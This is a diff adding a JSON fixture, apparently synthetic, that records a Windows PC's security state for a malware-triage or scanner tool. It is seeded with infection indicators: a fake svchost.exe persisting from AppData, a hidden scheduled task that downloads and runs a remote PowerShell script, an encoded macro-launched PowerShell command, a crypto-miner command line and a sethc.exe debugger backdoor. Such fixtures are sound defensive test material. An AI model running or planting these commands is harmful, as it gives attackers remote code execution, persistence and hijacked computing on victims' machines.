@@ -1,0 +1,548 @@
+{
+ "admin": true,
+ "os": "Microsoft Windows 11 Pro 10.0.26100",
+ "host": "JUNAID-PC",
+ "defender": {
+  "present": true,
+  "rtp": true,
+  "av": true,
+  "tamper": false,
+  "sigAge": 1,
+  "passive": false,
+  "otherAV": [],
+  "exclPath": [
+   "C:\\Users\\Junaid\\AppData\\Roaming\\SysCache"
+  ],
+  "exclProc": [],
+  "exclExt": [],
+  "pua": 0,
+  "netProt": 0,
+  "cfa": 0,
+  "cloud": 2,
+  "asr": {},
+  "readable": true
+ },
+ "fw": [
+  {
+   "profile": "Domain",
+   "enabled": true
+  },
+  {
+   "profile": "Private",
+   "enabled": true
+  },
+  {
+   "profile": "Public",
+   "enabled": false
+  }
+ ],
+ "uac": 1,
+ "smartscreen": "Warn",
+ "sac": 0,
+ "procs": [
+  {
+   "pid": 4,
+   "ppid": 0,
+   "name": "System",
+   "path": "",
+   "cmd": "",
+   "start": 1795053993,
+   "exists": false
+  },
+  {
+   "pid": 700,
+   "ppid": 600,
+   "name": "services.exe",
+   "path": "C:\\Windows\\System32\\services.exe",
+   "cmd": "",
+   "start": 1795053993,
+   "exists": true
+  },
+  {
+   "pid": 1200,
+   "ppid": 700,
+   "name": "svchost.exe",
+   "path": "C:\\Windows\\System32\\svchost.exe",
+   "cmd": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
+   "start": 1795054993,
+   "exists": true
+  },
+  {
+   "pid": 3000,
+   "ppid": 2900,
+   "name": "explorer.exe",
+   "path": "C:\\Windows\\explorer.exe",
+   "cmd": "C:\\Windows\\Explorer.EXE",
+   "start": 1795063993,
+   "exists": true
+  },
+  {
+   "pid": 4100,
+   "ppid": 3000,
+   "name": "svchost.exe",
+   "path": "C:\\Users\\Junaid\\AppData\\Roaming\\SysCache\\svchost.exe",
+   "cmd": "\"C:\\Users\\Junaid\\AppData\\Roaming\\SysCache\\svchost.exe\" -k update",
+   "start": 1795136993,
+   "exists": true
+  },
+  {
+   "pid": 5100,
+   "ppid": 3000,
+   "name": "WINWORD.EXE",
+   "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+   "cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Junaid\\Downloads\\Payment_Details.docm\"",
+   "start": 1795142193,
+   "exists": true
+  },
+  {
+   "pid": 5200,
+   "ppid": 5100,
+   "name": "powershell.exe",
+   "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "cmd": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+   "start": 1795142203,
+   "exists": true
+  },
+  {
+   "pid": 6100,
+   "ppid": 3000,
+   "name": "invoice_2026.pdf.exe",
+   "path": "C:\\Users\\Junaid\\Downloads\\invoice_2026.pdf.exe",
+   "cmd": "\"C:\\Users\\Junaid\\Downloads\\invoice_2026.pdf.exe\"",
+   "start": 1795140393,
+   "exists": true
+  },
+  {
+   "pid": 6200,
+   "ppid": 4100,
+   "name": "wuaucltx.exe",
+   "path": "C:\\Users\\Junaid\\AppData\\Local\\Temp\\wuaucltx.exe",
+   "cmd": "C:\\Users\\Junaid\\AppData\\Local\\Temp\\wuaucltx.exe -o stratum+tcp://pool.minexmr.example:4444 --donate-level 1",
+   "start": 1795137993,
+   "exists": false
+  },
+  {
+   "pid": 7000,
+   "ppid": 3000,
+   "name": "chrome.exe",
+   "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+   "cmd": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
+   "start": 1795138993,
+   "exists": true
+  },
+  {
+   "pid": 7100,
+   "ppid": 3000,
+   "name": "OneDrive.exe",
+   "path": "C:\\Users\\Junaid\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
+   "cmd": "",
+   "start": 1795063993,
+   "exists": true
+  }
+ ],
+ "sigs": {
+  "C:\\Windows\\System32\\services.exe": {
+   "st": "Valid",
+   "signer": "Microsoft Windows",
+   "ms": true
+  },
+  "C:\\Windows\\System32\\svchost.exe": {
+   "st": "Valid",
+   "signer": "Microsoft Windows",
+   "ms": true
+  },
+  "C:\\Windows\\explorer.exe": {
+   "st": "Valid",
+   "signer": "Microsoft Windows",
+   "ms": true
+  },
+  "C:\\Users\\Junaid\\AppData\\Roaming\\SysCache\\svchost.exe": {
+   "st": "NotSigned",
+   "signer": "",
+   "ms": false
+  },
+  "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE": {
+   "st": "Valid",
+   "signer": "Microsoft Corporation",
+   "ms": true
+  },
+  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe": {
+   "st": "Valid",
+   "signer": "Microsoft Windows",
+   "ms": true
+  },
+  "C:\\Users\\Junaid\\Downloads\\invoice_2026.pdf.exe": {
+   "st": "NotSigned",
+   "signer": "",
+   "ms": false
+  },
+  "C:\\Users\\Junaid\\AppData\\Local\\Temp\\wuaucltx.exe": {
+   "st": "NotSigned",
+   "signer": "",
+   "ms": false
+  },
+  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe": {
+   "st": "Valid",
+   "signer": "Google LLC",
+   "ms": false
+  },
+  "C:\\Users\\Junaid\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe": {
+   "st": "Valid",
+   "signer": "Microsoft Corporation",
+   "ms": true
+  },
+  "C:\\Users\\Junaid\\Downloads\\FreeMovies_Setup.exe": {
+   "st": "NotSigned",
+   "signer": "",
+   "ms": false
+  },
+  "C:\\Users\\Junaid\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs": {
+   "st": "NotSigned",
+   "signer": "",
+   "ms": false
+  },
+  "C:\\Windows\\System32\\cmd.exe": {
+   "st": "Valid",
+   "signer": "Microsoft Windows",
+   "ms": true
+  },
+  "C:\\Program Files\\Spotify\\Spotify.exe": {
+   "st": "Valid",
+   "signer": "Spotify AB",
+   "ms": false
+  }
+ },
+ "files": {
+  "C:\\Users\\Junaid\\AppData\\Roaming\\SysCache\\svchost.exe": {
+   "size": 812032,
+   "ctime": 1794971193,
+   "mtime": 1794971193,
+   "hidden": true,
+   "zone": -1,
+   "host": "",
+   "ref": "",
+   "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+   "desc": "Host Process for Windows Services",
+   "company": "",
+   "orig": "svchost.exe"
+  },
+  "C:\\Users\\Junaid\\Downloads\\invoice_2026.pdf.exe": {
+   "size": 455680,
+   "ctime": 1795140293,
+   "mtime": 1795140293,
+   "hidden": false,
+   "zone": 3,
+   "host": "https://cdn-files.example-share.top/d/invoice_2026.pdf.exe",
+   "ref": "https://mail.example.com/",
+   "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+   "desc": "",
+   "company": "",
+   "orig": ""
+  },
+  "C:\\Users\\Junaid\\AppData\\Local\\Temp\\wuaucltx.exe": {
+   "size": 2304000,
+   "ctime": 1795137893,
+   "mtime": 1795137893,
+   "hidden": false,
+   "zone": -1,
+   "host": "",
+   "ref": "",
+   "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+   "desc": "",
+   "company": "",
+   "orig": ""
+  },
+  "C:\\Users\\Junaid\\Downloads\\FreeMovies_Setup.exe": {
+   "size": 3302400,
+   "ctime": 1794711993,
+   "mtime": 1794711993,
+   "hidden": false,
+   "zone": 3,
+   "host": "https://free-movies-hd.example.xyz/setup.exe",
+   "ref": "https://free-movies-hd.example.xyz/",
+   "sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
+   "desc": "Setup",
+   "company": "",
+   "orig": ""
+  },
+  "C:\\Users\\Junaid\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs": {
+   "size": 1200,
+   "ctime": 1794971193,
+   "mtime": 1794971193,
+   "hidden": true,
+   "zone": -1,
+   "host": "",
+   "ref": "",
+   "sha256": "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
+   "desc": "",
+   "company": "",
+   "orig": ""
+  },
+  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe": {
+   "size": 1,
+   "ctime": 1787367993,
+   "mtime": 0,
+   "hidden": false,
+   "zone": -1,
+   "host": "",
+   "ref": "",
+   "sha256": "",
+   "desc": "Google Chrome",
+   "company": "Google LLC",
+   "orig": "chrome.exe"
+  },
+  "C:\\Program Files\\Spotify\\Spotify.exe": {
+   "size": 1,
+   "ctime": 1787367993,
+   "mtime": 0,
+   "hidden": false,
+   "zone": -1,
+   "host": "",
+   "ref": "",
+   "sha256": "",
+   "desc": "Spotify",
+   "company": "Spotify AB",
+   "orig": "Spotify.exe"
+  }
+ },
+ "autoruns": [
+  {
+   "kind": "run",
+   "where": "This user \u00b7 Run",
+   "name": "WindowsHostUpdate",
+   "value": "\"C:\\Users\\Junaid\\AppData\\Roaming\\SysCache\\svchost.exe\" -k update",
+   "target": "C:\\Users\\Junaid\\AppData\\Roaming\\SysCache\\svchost.exe",
+   "exists": true,
+   "hidden": false,
+   "author": "",
+   "key": "reg|HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|WindowsHostUpdate",
+   "off": false
+  },
+  {
+   "kind": "task",
+   "where": "Task Scheduler\\\\",
+   "name": "GoogleUpdaterTaskMachineUA",
+   "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -nop -c IEX (New-Object Net.WebClient).DownloadString('http://45.137.21.9/p.ps1')",
+   "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "exists": true,
+   "hidden": true,
+   "author": "",
+   "key": "task|\\GoogleUpdaterTaskMachineUA",
+   "off": false
+  },
+  {
+   "kind": "wmi",
+   "where": "WMI event subscription",
+   "name": "SCM Event Consumer",
+   "value": "cmd.exe /c start /min C:\\Users\\Junaid\\AppData\\Roaming\\SysCache\\svchost.exe",
+   "target": "C:\\Windows\\System32\\cmd.exe",
+   "exists": true,
+   "hidden": false,
+   "author": "",
+   "key": "wmi|CommandLineEventConsumer|SCM Event Consumer",
+   "off": false
+  },
+  {
+   "kind": "ifeo",
+   "where": "Image File Execution Options",
+   "name": "sethc.exe",
+   "value": "C:\\Windows\\System32\\cmd.exe",
+   "target": "C:\\Windows\\System32\\cmd.exe",
+   "exists": true,
+   "hidden": false,
+   "author": "",
+   "key": "ifeo|HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe|Debugger",
+   "off": false
+  },
+  {
+   "kind": "startup",
+   "where": "Startup folder",
+   "name": "update.vbs",
+   "value": "C:\\Users\\Junaid\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs",
+   "target": "C:\\Users\\Junaid\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs",
+   "exists": true,
+   "hidden": false,
+   "author": "",
+   "key": "file|C:\\Users\\Junaid\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs",
+   "off": false
+  },
+  {
+   "kind": "run",
+   "where": "All users \u00b7 Run",
+   "name": "OldPrinterHelper",
+   "value": "\"C:\\Program Files\\OldPrinter\\helper.exe\" /background",
+   "target": "C:\\Program Files\\OldPrinter\\helper.exe",
+   "exists": false,
+   "hidden": false,
+   "author": "",
+   "key": "reg|HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|OldPrinterHelper",
+   "off": false
+  },
+  {
+   "kind": "run",
+   "where": "This user \u00b7 Run",
+   "name": "OneDrive",
+   "value": "C:\\Users\\Junaid\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background",
+   "target": "C:\\Users\\Junaid\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
+   "exists": true,
+   "hidden": false,
+   "author": "",
+   "key": "reg|HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|OneDrive",
+   "off": false
+  },
+  {
+   "kind": "run",
+   "where": "This user \u00b7 Run",
+   "name": "Spotify",
+   "value": "\"C:\\Program Files\\Spotify\\Spotify.exe\" /minimized",
+   "target": "C:\\Program Files\\Spotify\\Spotify.exe",
+   "exists": true,
+   "hidden": false,
+   "author": "",
+   "key": "reg|HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|Spotify",
+   "off": false
+  }
+ ],
+ "conns": [
+  {
+   "pid": 4100,
+   "raddr": "185.220.101.47",
+   "rport": 4444,
+   "lport": 51234,
+   "state": "Established"
+  },
+  {
+   "pid": 6200,
+   "raddr": "94.130.12.30",
+   "rport": 3333,
+   "lport": 51240,
+   "state": "Established"
+  },
+  {
+   "pid": 7000,
+   "raddr": "142.250.74.110",
+   "rport": 443,
+   "lport": 51300,
+   "state": "Established"
+  }
+ ],
+ "threats": [
+  {
+   "name": "Trojan:Win32/Wacatac.B!ml",
+   "path": "C:\\Users\\Junaid\\Downloads\\crack_tool.zip",
+   "t": 1794884793,
+   "action": "",
+   "status": "Quarantined",
+   "sev": "5",
+   "id": "2147735503"
+  },
+  {
+   "name": "PUA:Win32/Presenoker",
+   "path": "C:\\Users\\Junaid\\Downloads\\YTDownloader.exe",
+   "t": 1794279993,
+   "action": "",
+   "status": "Allowed",
+   "sev": "1",
+   "id": "2147723456"
+  }
+ ],
+ "hosts": [
+  "127.0.0.1 update.microsoft.com",
+  "0.0.0.0 mpa.one.microsoft.com"
+ ],
+ "hostsN": 4,
+ "proxy": {
+  "on": false,
+  "server": "",
+  "pac": "http://wpad.example-ads.top/proxy.pac"
+ },
+ "roots": [
+  {
+   "subject": "DO_NOT_TRUST_FiddlerRoot",
+   "thumb": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+   "from": 1794107193,
+   "store": "CurrentUser"
+  }
+ ],
+ "policies": [
+  {
+   "browser": "Chrome",
+   "name": "ExtensionInstallForcelist",
+   "value": "ahfgeienlihckogmohjhadlkjgocpleb;https://clients2.google.com/service/update2/crx",
+   "key": "HKLM:\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist|1"
+  }
+ ],
+ "appx": [
+  {
+   "name": "king.com.CandyCrushSaga",
+   "id": "king.com.CandyCrushSaga_kgqvnymyfvs32",
+   "publisher": "king.com",
+   "size": 0,
+   "uninstall": "king.com.CandyCrushSaga_1.0_x86__kgqvnymyfvs32",
+   "removable": true
+  },
+  {
+   "name": "Microsoft.MicrosoftSolitaireCollection",
+   "id": "Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe",
+   "publisher": "Microsoft Corporation",
+   "size": 0,
+   "uninstall": "Microsoft.MicrosoftSolitaireCollection_4.1_x64__8wekyb3d8bbwe",
+   "removable": true
+  },
+  {
+   "name": "Microsoft.BingNews",
+   "id": "Microsoft.BingNews_8wekyb3d8bbwe",
+   "publisher": "Microsoft Corporation",
+   "size": 0,
+   "uninstall": "Microsoft.BingNews_4.1_x64__8wekyb3d8bbwe",
+   "removable": true
+  },
+  {
+   "name": "Microsoft.WindowsCalculator",
+   "id": "Microsoft.WindowsCalculator_8wekyb3d8bbwe",
+   "publisher": "Microsoft Corporation",
+   "size": 0,
+   "uninstall": "x",
+   "removable": true
+  },
+  {
+   "name": "MicrosoftCorporationII.QuickAssist",
+   "id": "MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe",
+   "publisher": "Microsoft Corporation",
+   "size": 0,
+   "uninstall": "y",
+   "removable": true
+  }
+ ],
+ "programs": [
+  {
+   "name": "McAfee LiveSafe",
+   "id": "MSC",
+   "publisher": "McAfee, LLC",
+   "size": 512000000,
+   "uninstall": "\"C:\\Program Files\\McAfee\\MSC\\mcuihost.exe\" /body:misp://MSCJsRes.dll::uninstall.html",
+   "removable": true
+  },
+  {
+   "name": "WinZip 28.0",
+   "id": "{CD95F661-A5C4-44F5-A6AA-ECDD91C2410B}",
+   "publisher": "Corel",
+   "size": 120000000,
+   "uninstall": "MsiExec.exe /I{CD95F661-A5C4-44F5-A6AA-ECDD91C2410B}",
+   "removable": true
+  },
+  {
+   "name": "Google Chrome",
+   "id": "Google Chrome",
+   "publisher": "Google LLC",
+   "size": 1,
+   "uninstall": "x",
+   "removable": true
+  }
+ ],
+ "downloads": [
+  "C:\\Users\\Junaid\\Downloads\\invoice_2026.pdf.exe",
+  "C:\\Users\\Junaid\\Downloads\\FreeMovies_Setup.exe"
+ ],
+ "notes": []
+}
